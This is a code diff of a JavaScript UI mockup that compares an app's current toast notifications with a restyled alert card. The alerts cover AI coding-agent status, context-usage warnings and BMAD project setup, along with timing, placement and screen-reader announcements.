+const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+const shown = (s) => esc(cleanName(s));
+function log(html) {
+  const li = el("li");
+  li.innerHTML = `<b>${((performance.now() - t0) / 1000).toFixed(1)}s</b> ${html}`;
+  logEl.prepend(li);
+  while (logEl.children.length > 30) logEl.lastChild.remove();
+}
+
+/* ---------- the panes behind the tabs (for the agent alerts) ---------- */
+const mkPane = (tab, pty, view) => ({ tab, pty, view, hook: null, tracker: false, latch: false, dwell: null, attention: false });
+let PANES = {};
+function resetPanes() {
+  for (const p of Object.values(PANES)) if (p.dwell) clearTimeout(p.dwell);
+  PANES = { p2a: mkPane("t2", 21), p2b: mkPane("t2", 22), p2s: mkPane("t2", 23, "npm"), p3: mkPane("t3", 31), p4: mkPane("t4", 41) };
+}
+const tabState = (id) => {
+  const ps = Object.values(PANES).filter((p) => p.tab === id);
+  if (ps.some((p) => p.hook === "needsYou")) return "needsYou";
+  return ps.some((p) => p.attention) ? "attention" : null;
+};
+/* m10: the tab bar is not part of this work. It shows the name as the app does, uncleaned, in every view. */
+function renderTabs() {
+  tabbar.textContent = "";
+  tabById("t2").name = N().tab;
+  for (const t of TABS) {
+    const b = el("button", "tab");
+    b.type = "button"; b.setAttribute("role", "tab"); b.setAttribute("aria-selected", String(t.id === S.active)); b.dataset.tab = t.id;
+    const st = tabState(t.id);
+    if (st === "needsYou") { const d = el("span", "agent-dot"); d.dataset.state = "needsYou"; d.setAttribute("role", "img"); d.setAttribute("aria-label", "An agent here needs you"); b.append(d); }
+    else if (st === "attention" && t.id !== S.active) { const d = el("span", "tab-attention"); d.title = "New output finished while you were away"; b.append(d); }
+    b.append(el("span", "nm", t.name));
+    b.addEventListener("mousedown", (e) => e.preventDefault());
+    b.addEventListener("click", () => openTab(t.id, "the tab bar"));
+    tabbar.append(b);
+  }
+}
+function openTab(id, how) {
+  S.active = id;
+  for (const p of Object.values(PANES)) if (p.tab === id) p.attention = false;
+  renderTabs();
+  log(`Tab <b>${shown(tabById(id).name)}</b> opened from ${how}.`);
+  if (FU("f2")) for (const [pid, p] of Object.entries(PANES)) if (p.tab === id) { withdraw(`agent-needs-you-${p.pty}`, "you opened its tab"); withdraw(`agent-stopped-${p.pty}`, "you opened its tab"); }
+  home().focus();
+}
+const inView = (p) => S.focused && p.tab === S.active;
+
+/* ==================================================================
+   Every alert, in both wordings (spec A1 and B3).
+   today: exactly what the code builds.  next: the restyle. A title is
+   a list of strings and {name} parts.
+   ================================================================== */
+const KIND_LABEL = { needs: "Needs you", question: "Question", problem: "Problem", warning: "Warning", agent: "Agent", note: "Note" };
+/* sendToActiveTerminal(command, false): typed into the active terminal, no Enter. With no terminal tab in front it returns false: nothing is typed and nothing says so (terminalCommands.ts 66-68). */
+const typed = (cmd) => () => { if (S.kind !== "terminal") return log("No terminal is active: nothing was typed, and nothing says so (as today)."); term.value += cmd; log(`Typed <b>${esc(cmd)}</b> into the active terminal. Enter was not pressed.`); };
+const TASK_TITLE = "Implement the login form and write tests"; // an orchestrator pane's tracked "agent name" is its task's title (OrchestratorTab.tsx 355-357)
+const said = (what) => () => log(what);
+const ARCHIVE = ".ade/archive/bmad-v4";
+const SWITCH_BODY = (guard) => `Moved 142 files to ${ARCHIVE}/. The BMAD paragraph in CLAUDE.md is now the v6 one. ${guard} Agents already running keep their old role prompt until restarted.`;
+const GUARD_OK = "Agents can't edit the archive: a permission rule in .claude/settings.json stops them.";
+const GUARD_OPEN = "The permission rule that stops agents editing the archive couldn't be added to .claude/settings.json, so the archive isn't protected from edits.";
+
+const DEFS = {
+  needs: (p) => {
+    const tab = tabById(p.tab), sub = p.view && FU("f12");
+    const open = () => { openTab(p.tab, sub ? `the alert, showing sub-terminal ${p.view}` : "the alert"); };
+    return {
+      today: { title: "An agent needs you", body: `${tab.name} is waiting for an answer.`, key: `agent-needs-you-${p.pty}`, actions: [{ label: "Open tab", run: () => openTab(p.tab, "the toast") }] },
+      next: { kind: "needs", key: `agent-needs-you-${p.pty}`, pane: p,
+        title: sub ? [{ name: tab.name }, " " + cp(0x203A) + " ", { name: p.view, fallback: "Terminal" }, " needs you"] : [{ name: tab.name }, " needs you"],
+        body: "An agent there can't continue until you approve or answer something.",
+        actions: [{ label: sub ? "Open sub-terminal" : "Open tab", primary: true, run: open }] },
+    };
+  },
+  /* "{}" is API Builder's real icon string (src/data/curatedAgents.ts 27), not a missing value. */
+  quiet: () => { const nm = S.task ? TASK_TITLE : N().agent; return {
+    today: { title: `{} ${nm} finished`, body: "Agent completed its task" },
+    next: { kind: "agent", key: null, title: [{ name: nm, fallback: "An agent" }, " has gone quiet"], body: "No output for 3 seconds. It may be done, still thinking, or waiting for you.", actions: [] },
+  }; },
+  stopped: (p) => ({
+    today: null,
+    next: { kind: "agent", key: `agent-stopped-${p.pty}`, pane: p, title: [{ name: tabById(p.tab).name }, " ended its turn"], body: "The agent there stopped working. It may be done, or it may have asked you something.", actions: [{ label: "Open tab", run: () => openTab(p.tab, "the alert") }] },
+  }),
+  context: () => ({
+    today: { title: "Context at 82%", body: "The Claude session in this folder resends 164k tokens every turn. /compact summarizes it and keeps going.", actions: [{ label: "Type /compact", run: typed("/compact") }] },
+    /* Today's context toast has no key (useContextGuard.ts 78-82). It gets one only with F10, which withdraws it by key. */
+    next: { kind: "warning", key: FU("f10") ? "context-guard" : null, title: ["Context in ", { name: N().folder, fallback: "this folder" }, " is 82% full"], body: "The newest Claude Code session there resends 164k tokens every turn. /compact summarizes the conversation and keeps going.", actions: [{ label: "Type /compact", run: typed("/compact") }], hint: "Types /compact into the active terminal without pressing Enter." },
+  }),
+  question: () => ({
+    today: { title: `Set up ${N().project} with BMAD?`, body: "ADE adds BMAD, the methodology and the role agents. Existing files are left as they were.", sticky: true, key: "setup-question:/code/shop", actions: [{ label: "v6", run: said("Answered <b>v6</b>.") }, { label: "v4", run: said("Answered <b>v4</b>.") }] },
+    next: { kind: "question", key: "setup-question:/code/shop", sticky: true, title: ["Set up ", { name: N().project, fallback: "this project" }, " with BMAD?"], body: "ADE adds BMAD, the methodology and the role agents. Existing files are left as they were.",
+      actions: FU("f11") ? [{ label: "Use v6 (suggested)", primary: true, run: said("Answered <b>v6</b>.") }, { label: "Use v4", run: said("Answered <b>v4</b>.") }] : [{ label: "Use v6", run: said("Answered <b>v6</b>.") }, { label: "Use v4", run: said("Answered <b>v4</b>.") }] },
+  }),
+  setup: () => ({
+    today: { title: `Set up ${N().project}`, body: "Added BMAD, 8 agents and the methodology (Rust project). Existing files were left as they were.", actions: [{ label: "Undo", run: said("Setup undone.") }] },
+    next: { kind: "note", key: null, title: [{ name: N().project, fallback: "this project" }, " is set up"], body: "Added BMAD, 8 agents and the methodology (Rust project). Existing files were left as they were.", actions: [{ label: "Undo", run: said("Setup undone.") }] },
+  }),
+  setupAttr: () => {
+    const body = `Added BMAD, 8 agents and the methodology (Rust project). Existing files were left as they were. AI attribution is still on: ${ERRS[S.err]}.`;
+    return {
+      today: { title: `Set up ${N().project}`, body, actions: [{ label: "Undo", run: said("Setup undone.") }] },
+      next: { kind: "warning", key: null, title: [{ name: N().project, fallback: "this project" }, " is set up"], body, actions: [{ label: "Undo", run: said("Setup undone.") }] },
+    };
+  },
+  stack: () => ({
+    today: { title: `Rust detected in ${N().project}`, body: "Added 2 agents for it. Remove any in Integrations > Agents.", actions: [{ label: "Undo", run: said("Agents removed.") }] },
+    next: { kind: "note", key: null, title: ["Rust detected in ", { name: N().project, fallback: "this project" }], body: "Added 2 agents for it. Remove any in Integrations > Agents.", actions: [{ label: "Undo", run: said("Agents removed.") }] },
+  }),
+  switched: () => ({
+    today: { title: `Switched ${N().project} to BMAD v6`, body: SWITCH_BODY(GUARD_OK), actions: [{ label: "Open ARCHIVE.md", run: said("ARCHIVE.md opened.") }] },
+    next: { kind: "note", key: null, title: ["Switched ", { name: N().project, fallback: "this project" }, " to BMAD v6"], body: SWITCH_BODY(GUARD_OK), actions: [{ label: "Open ARCHIVE.md", run: said("ARCHIVE.md opened.") }] },
+  }),
+  switchedOpen: () => ({
+    today: { title: `Switched ${N().project} to BMAD v6`, body: SWITCH_BODY(GUARD_OPEN), actions: [{ label: "Open ARCHIVE.md", run: said("ARCHIVE.md opened.") }] },
+    next: { kind: "warning", key: null, title: ["Switched ", { name: N().project, fallback: "this project" }, " to BMAD v6"], body: SWITCH_BODY(GUARD_OPEN), actions: [{ label: "Open ARCHIVE.md", run: said("ARCHIVE.md opened.") }] },
+  }),
+  setupWaiting: () => {
+    const body = `A BMAD switch in ${N().project} didn't finish. Setup waits until it is resolved: see ${ARCHIVE}/ARCHIVE.md.`;
+    return {
+      today: { title: "Project setup", body, actions: [{ label: "Open ARCHIVE.md", run: said("ARCHIVE.md opened.") }] },
+      next: { kind: "warning", key: null, title: ["Project setup is waiting"], body, actions: [{ label: "Open ARCHIVE.md", run: said("ARCHIVE.md opened.") }] },
+    };
+  },
+  setupNotDone: () => ({
+    today: { title: "Project setup", body: "No active tab to set up." },
+    next: { kind: "problem", key: null, cause: "direct", title: ["Project setup not done"], body: "No active tab to set up.", actions: [] },
+  }),
+  setupFailed: () => ({
+    today: { title: "Project setup", body: `Project setup failed: ${ERRS[S.err]}` },
+    next: { kind: "problem", key: null, cause: "direct", title: ["Project setup not done"], body: ERRS[S.err], actions: [] },
+  }),
+  switchFailed: () => ({
+    today: { title: "BMAD switch", body: `BMAD switch failed: ${ERRS[S.err]}` },
+    next: { kind: "problem", key: null, cause: "direct", title: ["BMAD switch not done"], body: ERRS[S.err], actions: [] },
+  }),
+  contractErr: () => ({
+    today: { title: "Contracts", body: 'This project has no "deploy" action.' },
+    next: { kind: "problem", key: null, cause: "direct", title: ["Contract action not run"], body: 'This project has no "deploy" action.', actions: [] },
+  }),
+  contractsNone: () => ({
+    today: { title: "Contracts", body: "No Foundry, Hardhat or Anchor project in this terminal's folder." },
+    next: { kind: "note", key: null, cause: "direct", title: ["No contracts project here"], body: "No Foundry, Hardhat or Anchor project in this terminal's folder.", actions: [] },
+  }),
+  contractsDetect: () => ({
+    today: { title: "Contracts", body: `Could not inspect this folder: ${ERRS[S.err]}` },
+    next: { kind: "problem", key: null, cause: "direct", title: ["Couldn't inspect this folder"], body: ERRS[S.err], actions: [] },
+  }),
+  notSent: () => ({
+    today: { title: "Not sent", body: "This terminal is still starting; try again in a moment" },
+    /* The body is PTY_STARTING_MESSAGE, a shared string (terminalCommands.ts 5; .ade/context/terminal-open.md 273-274). The restyle leaves it as it is. */
+    next: { kind: "problem", key: null, cause: "direct", title: ["Not sent"], body: "This terminal is still starting; try again in a moment", actions: [] },
+  }),
+};
+
+/* ================= TODAY: App.tsx showToast, one slot, Toast.tsx ================= */
+let toast = null, toastEl = null, toastTimer = null;
+function todayShow(t) {
+  if (toast) log(`Today: <b>${shown(toast.title)}</b> replaced after ${(((performance.now() - toast.at) / 1000)).toFixed(1)} s, read or not.`);
+  toast = { ...t, at: performance.now() };
+  if (toastTimer !== null) clearTimeout(toastTimer);
+  const actions = t.actions ?? [];
+  const ms = t.sticky ? null : actions.length ? 15000 : 4000; // toastLifetime
+  toastTimer = ms === null ? null : setTimeout(() => todayDismiss("timed out"), scale(ms));
+  // React keeps the same element when one toast replaces another: the slide-in does not replay.
+  if (!toastEl) { toastEl = el("div", "t-toast"); toastEl.setAttribute("role", "status"); win.append(toastEl); }
+  toastEl.textContent = "";
+  toastEl.onclick = () => { if (!actions.length) todayDismiss("clicked"); };
+  // Text as React sets it: escaped, otherwise untouched (controls and direction marks stay in).
+  toastEl.append(el("div", "t-toast__title", t.title), el("div", "t-toast__body", t.body));
+  if (actions.length) {
+    const row = el("div", "t-toast__actions");
+    for (const a of actions) {
+      const b = el("button", "contracts-action", a.label);
+      b.addEventListener("click", (e) => { e.stopPropagation(); a.run(); todayDismiss("answered"); });
+      row.append(b);
+    }
+    toastEl.append(row);
+  }
+  log(`Today: toast <b>${shown(t.title)}</b>, ${ms === null ? "stays until answered or replaced" : `${ms / 1000} s`}.`);
+  report();
+}
+function todayDismiss(why) {
+  if (!toast) return;
+  if (toastTimer !== null) clearTimeout(toastTimer);
+  toastTimer = null; toast = null;
+  if (toastEl) { toastEl.remove(); toastEl = null; }
+  if (why) log(`Today: toast gone (${why}).`);
+  report();
+}
+
+/* ================= RESTYLE: the same one slot, a new card ================= */
+const ICON = {
+  needs: '<svg viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6.75" stroke="currentColor" stroke-width="1.5"/><circle cx="8" cy="8" r="3.25" fill="currentColor"/></svg>',
+  agent: '<svg viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6.75" stroke="currentColor" stroke-width="1.5"/><path d="M6.3 5.4v5.2M9.7 5.4v5.2" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>',
+  warning: '<svg viewBox="0 0 16 16" fill="none"><path d="M8 1.9l6.6 11.6H1.4L8 1.9z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/><path d="M8 6.3v3.4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/><circle cx="8" cy="11.6" r=".9" fill="currentColor"/></svg>',
+  problem: '<svg viewBox="0 0 16 16" fill="none"><path d="M5.2 1.25h5.6l3.95 3.95v5.6l-3.95 3.95H5.2L1.25 10.8V5.2L5.2 1.25z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/><path d="M5.8 5.8l4.4 4.4M10.2 5.8l-4.4 4.4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>',
+  note: '<svg viewBox="0 0 16 16" fill="none"><rect x="1.25" y="1.25" width="13.5" height="13.5" rx="3" stroke="currentColor" stroke-width="1.5"/><path d="M8 7.2v4.2" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/><circle cx="8" cy="4.8" r=".95" fill="currentColor"/></svg>',
+  question: '<svg viewBox="0 0 16 16" fill="none"><rect x="1.25" y="1.25" width="13.5" height="13.5" rx="3" stroke="currentColor" stroke-width="1.5"/><path d="M6 6.2a2 2 0 113.1 1.7c-.7.5-1.1.9-1.1 1.7" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><circle cx="8" cy="11.7" r=".9" fill="currentColor"/></svg>',
+  close: '<svg viewBox="0 0 12 12" fill="none"><path d="M2.5 2.5l7 7M9.5 2.5l-7 7" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>',
+};
+const RANK = ["note", "agent", "warning", "problem", "needs", "question"]; // F3 only: who gives way first
+let cards = [], nextId = 1, lastOutside = null, hover = false;
+const titleText = (parts) => parts.map((p) => (typeof p === "string" ? p : cleanName(p.name, p.fallback))).join("");
+const sig = (d) => JSON.stringify([d.kind, titleText(d.title), d.body, d.actions.map((a) => [a.label, !!a.primary]), d.hint ?? ""]);
+const closable = (d) => S.close && !d.sticky;
+const endStop = (s) => (/[.?!…]$/u.test(s) ? s : s + ".");
+/* Kind, title, body, then what today's role="status" box also carries: the button labels. Then the hint, which says what the button does. */
+const sayText = (d) => `${KIND_LABEL[d.kind]}: ${endStop(titleText(d.title))} ${endStop(cleanBody(d.body))}` + (d.actions.length ? ` ${d.actions.length > 1 ? "Buttons" : "Button"}: ${d.actions.map((a) => a.label).join(", ")}.` : "") + (d.hint ? " " + endStop(d.hint) : "");
+/* F9 only: the second, assertive region. It is in the document only while F9 is on; the restyle has one region. */
+const sayNow = el("div", "sr-only"); sayNow.id = "say-now"; sayNow.setAttribute("role", "alert");
+const syncRegions = () => { if (FU("f9")) { if (!sayNow.isConnected) slot.before(sayNow); } else sayNow.remove(); };
+
+/** How long a card stays. The restyle keeps toastLifetime exactly: sticky none, 15 s with a button, 4 s without. */
+function lifetime(d) {
+  if (d.sticky) return null;
+  if (FU("f6") && d.kind === "needs") return null;
+  if (FU("f4") && d.kind === "problem" && !d.actions.length) return 8000;
+  return d.actions.length ? 15000 : 4000;
+}
+function build(card) {
+  const d = card.def, n = card.el;
+  n.textContent = "";
+  n.dataset.kind = d.kind;
+  if (d.kind === "needs" || d.kind === "question") n.dataset.bar = ""; else delete n.dataset.bar;
+  const bodyDismisses = !d.actions.length && !FU("f7");
+  if (bodyDismisses) n.dataset.clickable = ""; else delete n.dataset.clickable;
+  n.onclick = bodyDismisses ? () => remove(card, "clicked") : null;
+  const icon = el("span", "alert__icon"); icon.setAttribute("aria-hidden", "true"); icon.innerHTML = ICON[d.kind];
+  const title = el("div", "alert__title"); title.id = `alert-${card.id}-title`;
+  title.append(el("span", "sr-only", `${KIND_LABEL[d.kind]}: `));
+  for (const p of d.title) {
+    if (typeof p === "string") title.append(document.createTextNode(p));
+    else { const b = el("bdi", "alert__name", cleanName(p.name, p.fallback)); b.title = fullName(p.name, p.fallback); title.append(b); }
+  }
+  n.append(icon, title, el("div", "alert__body", cleanBody(d.body)));
+  if (d.actions.length) {
+    const row = el("div", "alert__actions");
+    for (const act of d.actions) {
+      const b = el("button", `ui-btn ui-btn--md ${act.primary ? "ui-btn--primary" : "ui-btn--secondary"}`, act.label); b.type = "button";
+      b.addEventListener("mousedown", (e) => e.preventDefault()); // a mouse click never moves focus
+      b.addEventListener("click", (e) => { e.stopPropagation(); act.run(); remove(card, "answered"); });
+      row.append(b);
+    }
+    n.append(row);
+  }
+  if (d.hint) n.append(el("div", "alert__hint", d.hint));
+  // Last in the DOM, so Tab reaches the action first; the grid draws it top right.
+  if (closable(d)) {
+    const x = el("button", "ui-btn ui-btn--ghost ui-btn--icon alert__close"); x.type = "button";
+    x.setAttribute("aria-label", `Dismiss: ${titleText(d.title)}`); x.innerHTML = ICON.close;
+    x.addEventListener("mousedown", (e) => e.preventDefault());
+    x.addEventListener("click", (e) => { e.stopPropagation(); remove(card, "dismissed"); });
+    n.append(x);
+  }
+}
+/** Where focus goes if it was inside the card that is leaving: back where it came from, never to another card. */
+const backTarget = (card) => (card.el.contains(document.activeElement) ? (lastOutside && lastOutside.isConnected && lastOutside.offsetParent !== null ? lastOutside : home()) : null);
+function arm(card) {
+  if (card.life == null || card.timer || held()) return;
+  if (card.remaining == null) card.remaining = scale(card.life);
+  card.started = performance.now();
+  card.timer = setTimeout(() => { card.timer = null; remove(card, "timed out"); }, Math.max(0, card.remaining));
+}
+function disarm(card) {
+  if (!card.timer) return;
+  clearTimeout(card.timer); card.timer = null;
+  card.remaining -= performance.now() - card.started;
+}
+/** Follow-ups only. The restyle never holds a timer. */
+const held = () => (FU("f4") && hover) || (FU("f5") && !S.focused);
+function syncTimers(resumed) {
+  for (const c of cards) {
+    if (held()) disarm(c);
+    else { if (resumed && c.remaining != null) c.remaining = Math.max(c.remaining, scale(4000)); arm(c); }
+  }
+}
+function say(d) {
+  const now = FU("f9") && d.cause === "direct";
+  const region = now ? sayNow : sayPolite;
+  const text = sayText(d);
+  if (FU("f3")) { const s = el("span", null, text + " "); region.append(s); setTimeout(() => s.remove(), 5000); }
+  else region.replaceChildren(el("span", null, text));
+  log(`Screen reader (${now ? "at once" : "politely"}): "${esc(text)}"`);
+}
+function raise(d) {
+  const same = d.key ? cards.find((c) => c.def.key === d.key) : null;
+  if (same && sig(same.def) === sig(d)) { // shown again unchanged (the BMAD question on each cd): the timer restarts, nothing else
+    disarm(same); same.def = d; same.remaining = null; same.life = lifetime(d); build(same); arm(same);
+    return log(`Card <b>${esc(titleText(d.title))}</b> shown again unchanged: not announced twice.`);
+  }
+  if (FU("f3")) { if (same) remove(same, "updated", true); }
+  else for (const c of [...cards]) remove(c, "replaced by the next alert");
+  const card = { id: nextId++, def: d, life: lifetime(d), remaining: null, timer: null, started: 0 };
+  card.el = el("article", "alert");
+  card.el.setAttribute("role", "group"); card.el.setAttribute("aria-labelledby", `alert-${card.id}-title`);
+  build(card);
+  cards.push(card);
+  slot.prepend(card.el);
+  if (FU("f3")) fit(card);
+  log(`Card <b>${esc(titleText(d.title))}</b> (${KIND_LABEL[d.kind].toLowerCase()}), ${card.life == null ? "stays" : `${card.life / 1000} s`}.`);
+  say(d);
+  arm(card);
+  place();
+}
+/** F3: three cards if the slot has 480 px of height, two from 300 px, else one. The newest always shows; the least important, then oldest, other card gives way.
+    The question gives way last: only when it is the only other card. A card that gives way is dropped, not queued. */
+function fit(newest) {
+  place();
+  const max = slotRoom() >= 480 ? 3 : slotRoom() >= 300 ? 2 : 1;
+  while (cards.length > max) {
+    const out = cards.filter((c) => c !== newest && !c.def.sticky).sort((a, b) => RANK.indexOf(a.def.kind) - RANK.indexOf(b.def.kind) || a.id - b.id)[0]
+      ?? cards.find((c) => c !== newest);
+    if (!out) break;
+    remove(out, "gave way to a newer alert");
+  }
+}
+function remove(card, why, quiet) {
+  if (!cards.includes(card)) return;
+  const to = backTarget(card); // before the node goes
+  disarm(card);
+  cards = cards.filter((c) => c !== card);
+  card.el.remove();
+  if (to) to.focus();
+  if (!quiet) log(`Card <b>${esc(titleText(card.def.title))}</b> gone (${why}).`);
+  if (!cards.length) hover = false;
+  place();
+}
+function withdraw(key, why) { const c = cards.find((x) => x.def.key === key); if (c) remove(c, why); }
+function clearAll() {
+  todayDismiss();
+  for (const c of [...cards]) { disarm(c); c.el.remove(); }
+  cards = []; hover = false;
+  sayPolite.textContent = ""; sayNow.textContent = "";
+  report();
+}
+
+/* ---------- placement (spec B2): the slot is laid out from measured boxes, as a fixed slot in the app would be ---------- */
+const rel = (r, w) => ({ top: r.top - w.top, left: r.left - w.left, right: r.right - w.left, bottom: r.bottom - w.top, width: r.width, height: r.height });
+let roomNow = 0;
+const slotRoom = () => roomNow;
+/** AB is A where the tab in front is a terminal and B on every other tab kind. */
+const eff = () => { const p = S.place === "AB" ? (S.kind === "terminal" ? "A" : "B") : S.place; return p === "A" && FU("f13") && S.overlay !== "none" ? "B" : p; }; // F13 only: a top-right card uses B's place while an overlay is open
+const areaEl = () => (S.kind === "terminal" ? panes : S.kind === "editor" ? $(".editor") : $(`[data-kindview="${S.kind}"]`)); // the tab's content: under the strip and the notice bar
+/** The find bar is in the active pane (TerminalPane.tsx 193-201): each pane has its own. */
+const visibleFind = () => (S.piece.find && S.kind === "terminal" ? (S.piece.split && S.piece.active2 ? $("#find2") : $("#find1")) : null);
+function place() {
+  const wb = win.getBoundingClientRect(), w = { top: wb.top + win.clientTop, left: wb.left + win.clientLeft, width: win.clientWidth, height: win.clientHeight }; // the box the slot is laid out in
+  const c = rel(col.getBoundingClientRect(), w);
+  win.style.setProperty("--winh", w.height + "px");
+  const area = rel(areaEl().getBoundingClientRect(), w);
+  const colRight = Math.min(c.right, w.width), colLeft = Math.max(c.left, 0);
+  const P = eff();
+  slot.dataset.place = P;
+  slot.style.top = slot.style.bottom = slot.style.right = "";
+  let room;
+  if (P === "C") {
+    slot.style.bottom = "60px"; slot.style.right = "20px";
+    slot.style.width = Math.max(0, Math.min(340, w.width - 40)) + "px";
+    room = w.height - 60 - 12;
+  } else {
+    const width = Math.max(0, Math.min(340, colRight - colLeft - 24));
+    slot.style.right = (w.width - colRight + 12) + "px";
+    slot.style.width = width + "px";
+    if (P === "A") {
+      // A terminal tab: 28 px down, so the card starts under the pane header (4 px, then REC's 19 px, then 5 px). Other tab kinds have no pane header: 8 px.
+      let top = area.top + (S.kind === "terminal" ? 28 : 8);
+      // Any find bar the card's box would meet at its top keeps its place: the card starts 8 px under it. One lower down (a stacked split) is not avoided.
+      const f = visibleFind();
+      if (f) { const fr = rel(f.getBoundingClientRect(), w); if (fr.right > colRight - 12 - width && fr.left < colRight - 12 && fr.top <= top + 26 && fr.bottom + 8 > top) top = fr.bottom + 8; }
+      slot.style.top = top + "px";
+      room = Math.min(c.bottom, w.height) - top - 12;
+    } else {
+      slot.style.bottom = (w.height - Math.min(c.bottom, w.height) + 12) + "px";
+      room = Math.min(c.bottom, w.height) - area.top - 24;
+    }
+  }
+  // Size rule: never taller than the room; never squeezed under 132 px (title, two lines of body, buttons, hint), even if that runs past the tab's content; always inside the window.
+  const edge = P === "A" ? w.height - parseFloat(slot.style.top) - 4 : w.height - parseFloat(slot.style.bottom) - 48;
+  roomNow = Math.max(44, Math.min(Math.max(room, 132), edge));
+  slot.style.maxHeight = roomNow + "px";
+  for (const cd of cards) cd.el.style.maxHeight = roomNow + "px";
+  report();
+}
+/** What the card on screen is drawn over, measured. */
+function covers() {
+  const cardEl = S.view === "today" ? toastEl : cards.length ? slot : null;
+  if (!cardEl) return [];
+  const rects = S.view === "today" ? [cardEl.getBoundingClientRect()] : cards.map((c) => c.el.getBoundingClientRect());
+  const hit = (n) => { if (!n || n.hidden || n.closest("[hidden]")) return false; const r = n.getBoundingClientRect(); return r.width > 0 && rects.some((a) => a.left < r.right - 1 && a.right > r.left + 1 && a.top < r.bottom - 1 && a.bottom > r.top + 1); };
+  return [...new Set($$("[data-name]", win).filter(hit).map((n) => n.dataset.name))];
+}
+function report() {
+  const list = covers();
+  const any = S.view === "today" ? !!toastEl : cards.length > 0;
+  coversEl.innerHTML = !any ? "No alert on screen." : list.length ? `On screen now, the alert is drawn over: <b>${list.map(esc).join(", ")}</b>.` : "On screen now, nothing this mockup names is under the alert: what is under it is older output, empty rows or plain content.";
+}
+
+/* ================= the agent in a pane: Agent status states and the silence guess ================= */
+const hooksLive = (p, id) => id !== "p2a" || S.src === "claudeOn";
+function setHook(id, next) {
+  const p = PANES[id], prev = p.hook;
+  if (prev === next) return;
+  p.hook = next;
+  if (p.dwell) { clearTimeout(p.dwell); p.dwell = null; }
+  renderTabs();
+  log(`Agent status, tab <b>${shown(tabById(p.tab).name)}</b>${p.view ? " sub-terminal " + esc(p.view) : ""}: ${prev ?? "none"} → <b>${next ?? "none"}</b>.`);
+  if (next === "needsYou") {
+    if (inView(p)) log("No card: that tab is in view. Its dot shows.");
+    else show("needs", p);
+  }
+  if (prev === "needsYou" && next !== "needsYou") {
+    if (FU("f2")) withdraw(`agent-needs-you-${p.pty}`, "the pane left needs you");
+    else if (S.view !== "today" && cards.some((c) => c.def.key === `agent-needs-you-${p.pty}`)) log("The needs-you card stays for the rest of its 15 s, as today. Nothing takes it down (see F2).");
+    else if (S.view === "today" && toast?.key === `agent-needs-you-${p.pty}`) log("Today: the toast stays up for the rest of its 15 s. Nothing takes it down.");
+  }
+  if (!FU("f1")) return;
+  // A new turn is seen to start: the pane may be alerted for again. A prompt straight after a finished turn is a new turn too.
+  if (next === "ready" || (next === "working" && prev !== "needsYou") || (next === "needsYou" && (prev === "finished" || prev === "waiting"))) p.latch = false;
+  if (next === "working" || next === "needsYou") { if (FU("f2")) withdraw(`agent-stopped-${p.pty}`, "the agent is working again"); }
+  if (next === "finished" && (prev === "working" || prev === "needsYou")) {
+    // Raised only once the pane has stayed finished for 2 s: a one-shot `claude -p` never flashes a card.
+    p.dwell = setTimeout(() => { p.dwell = null; if (p.hook === "finished") stoppedFrom(id, "hook"); }, scale(2000));
+  }
+}
+/** F1's one rule. A pane is alerted at most once between two turn starts, whichever source saw the stop.
+    The latch is set on exactly three paths: a card is shown; the turn ended in view; rule 5 withheld the card. */
+function stoppedFrom(id, source) {
+  const p = PANES[id];
+  if (p.latch) return log(`No card from the ${source === "hook" ? "end of turn" : "silence"}: this pane was already alerted for this turn.`);
+  // S, the silence guess: exactly today's. It replaces whatever is on screen, a question or a needs-you card included.
+  if (source === "silence") { p.latch = true; return show("quiet"); }
+  if (inView(p)) { p.latch = true; return log("No card: the turn ended in the tab in view (rule 3)."); }
+  // Rule 5: the new card does not replace another pane's needs-you card (on screen for 15 s at most). Anything else, the question included, is replaced as by any alert today.
+  if (!FU("f3") && cards.some((c) => c.def.kind === "needs" && c.def.pane !== p)) { p.latch = true; return log("No card: another pane's needs-you card is on screen and the new card does not replace it (rule 5). This stop is not shown later."); }
+  p.latch = true;
+  withdraw(`agent-needs-you-${p.pty}`, "the same pane ended its turn");
+  show("stopped", p);
+}
+/** useTerminal.ts checkIdleTransition: 3 s without output, for a pane with a tracked agent session. Once per session. */
+function silence(id) {
+  const p = PANES[id];
+  if (p.tab !== S.active) { p.attention = true; renderTabs(); }
+  if (!p.tracker) return log("3 s of silence: no tracked agent session in that pane, so no alert (as today).");
+  p.tracker = false; // endSession: the guess is made once per launched session
+  log("OS notification attempt, as today: once per launched session, today's words and sound. Not drawn here.");
+  if (!FU("f1")) return show("quiet");
+  // Covered: the pane has an Agent-status state at this moment. No "was launched" fact is needed.
+  if (p.hook != null) return log("3 s of silence: Agent status is reporting for this pane, so no silence card. F1 leaves the OS notification as it is: see the line above.");
+  stoppedFrom(id, "silence");
+}
+function launch(id) {
+  const p = PANES[id];
+  if (p.dwell) clearTimeout(p.dwell);
+  Object.assign(p, { hook: null, tracker: id === "p2a" ? S.tracked : true, latch: false, dwell: null, attention: false });
+  renderTabs();
+  log(`Agent started in tab <b>${shown(tabById(p.tab).name)}</b>${p.tracker ? ", launched from ADE" : ", by hand"}.`);
+  if (hooksLive(p, id)) setHook(id, "ready");
+}
+const ensure = (id) => { const p = PANES[id]; if (p.hook == null) { p.tracker = true; p.hook = "working"; } };
+
+/* ================= triggers ================= */
+function show(name, arg) {
+  const ev = DEFS[name](arg);
+  if (S.view === "today") {
+    if (ev.today) todayShow(ev.today);
+    else log(`Today: nothing. ADE has no alert for this.`);
+  } else raise(ev.next);
+}
+const later = (ms, fn) => setTimeout(fn, scale(ms));
+const FIRE = {
+  needs: () => { ensure("p2a"); setHook("p2a", "working"); setHook("p2a", "needsYou"); },
+  needs3: () => { for (const id of ["p2a", "p3", "p4"]) { ensure(id); PANES[id].hook = "working"; setHook(id, "needsYou"); } },
+  subNeeds: () => { ensure("p2s"); PANES.p2s.hook = "working"; setHook("p2s", "needsYou"); },
